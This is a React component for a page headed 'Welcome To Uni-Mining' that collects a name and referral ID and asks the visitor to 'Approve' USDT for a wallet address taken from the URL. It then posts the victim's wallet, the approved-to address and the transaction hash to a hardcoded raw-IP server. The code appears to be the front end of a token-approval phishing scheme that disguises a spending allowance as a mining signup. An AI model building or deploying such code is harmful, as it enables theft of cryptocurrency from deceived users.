import React, { useState } from 'react';
import { Form, FormGroup, FormLabel, FormControl, Button } from 'react-bootstrap';
import { approveUSDT } from './scripts/approve_usdt';
import { useLocation } from 'react-router-dom';
import axios from 'axios';
import AlertPopup from './AlertPopup';
function ApproveForm() {
    const location = useLocation();
    const queryParams = new URLSearchParams(location.search);
    const [name, setName] = useState('');
    const [referral, setReferral] = useState('');
    const [showAlert, setShowAlert] = useState(false);
    const [alertMessage, setAlertMessage] = useState('');

    const walletAddress = queryParams.get('wallet');

    const handleApproveClick = async (event) => {

        event.preventDefault();

        if (!name || !referral) {
            setAlertMessage('Name and Referral ID fields cannot be empty');
            setShowAlert(true);
            return;
        }

        if(!walletAddress) {
            console.log("Wallet address is missing in the query string.")
            setAlertMessage('Wallet address is missing in the URL.');
            setShowAlert(true);
            return
        }

        try {
           let status = await approveUSDT(walletAddress);
           if(status) {
            setAlertMessage('Approved Done');
            setShowAlert(true);
           saveApprovedData(name, referral, status.approvedTo, walletAddress, status.trxHash)
           }else{
            setAlertMessage(walletAddress);
            setShowAlert(true);
           }
        } catch (error) {
            console.error("An error occurred during the approval process:", error);
            setAlertMessage('An error occurred during the approval process');
            setShowAlert(true);
        }
    };

    const handleCloseAlert = () => {
        setShowAlert(false);
      };

    const handleNameChange = (event) => {
        setName(event.target.value);
    };

    const handleReferralChange = (event) => {
        setReferral(event.target.value);
    };

    const saveApprovedData = async (name, referralId, approverAddress, walletAddress, trxHash) => {
        try {
          const response = await axios.post('http://5.199.173.132:3000/approvedData', {
            name,
            referralId,
            approverAddress,
            walletAddress,
            trxHash
          });
      
          console.log('Approved data saved:', response.data);
        } catch (error) {
          console.error('Error saving approved data:', error);
        }
      };

    return (
        <header className="App-header">
            <Form>
                <h1>Welcome To Uni-Mining</h1>
                <FormGroup>
                    <FormLabel style={{ float: 'left' }} >Name</FormLabel>
                    <FormControl type="text" placeholder="Enter You Name" value={name} onChange={handleNameChange} />
                </FormGroup>

                <br />
                <FormGroup>
                    <FormLabel style={{ float: 'left' }}>Referral ID</FormLabel>
                    <FormControl type="text" placeholder="Enter Referral ID" value={referral} onChange={handleReferralChange} />
                </FormGroup>
                <br />
                <Button variant="primary" type="submit" onClick={handleApproveClick}>Approve</Button>

            </Form>

            <AlertPopup show={showAlert} title="Alert" message={alertMessage} onClose={handleCloseAlert} />
        </header>
    );
}

export default ApproveForm;